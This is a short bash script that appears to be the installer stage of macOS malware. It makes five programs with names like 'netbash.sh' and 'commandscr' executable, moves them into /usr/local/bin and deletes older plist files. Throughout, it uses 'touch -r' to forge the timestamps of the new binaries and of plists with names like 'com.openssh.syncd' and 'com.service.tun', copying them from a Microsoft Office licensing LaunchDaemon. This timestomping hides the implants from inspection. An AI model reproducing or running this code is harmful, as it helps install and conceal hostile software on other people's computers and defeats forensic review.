#!/bin/bash


chmod 755 streamproc
chmod 755 appsync
chmod 755 commandscr
chmod 755 netbash.sh
chmod 755 perlconf

mv -f ./streamproc /usr/local/bin/
mv -f ./appsync /usr/local/bin/
mv -f ./commandscr /usr/local/bin/
mv -f ./netbash.sh /usr/local/bin/
mv -f ./perlconf /usr/local/bin/

rm -f /usr/share/preferences/applehelpd.plist 
rm -f /usr/share/preferences/applesync.plist
rm -f /usr/share/preferences/youservere.txt

touch -r /Library/LaunchDaemons/com.microsoft.office.licensing.helper.plist /usr/share/preferences/com.streamd.plist
touch -r /Library/LaunchDaemons/com.microsoft.office.licensing.helper.plist /usr/share/preferences/com.openssh.syncd.plist
touch -r /Library/LaunchDaemons/com.microsoft.office.licensing.helper.plist /usr/share/preferences/com.service.tun.plist
touch -r /Library/LaunchDaemons/com.microsoft.office.licensing.helper.plist /usr/local/bin/streamproc
touch -r /Library/LaunchDaemons/com.microsoft.office.licensing.helper.plist /usr/local/bin/appsync
touch -r /Library/LaunchDaemons/com.microsoft.office.licensing.helper.plist /usr/local/bin/commandscr
touch -r /Library/LaunchDaemons/com.microsoft.office.licensing.helper.plist /usr/local/bin/netbash.sh
touch -r /Library/LaunchDaemons/com.microsoft.office.licensing.helper.plist /usr/local/bin/perlconf
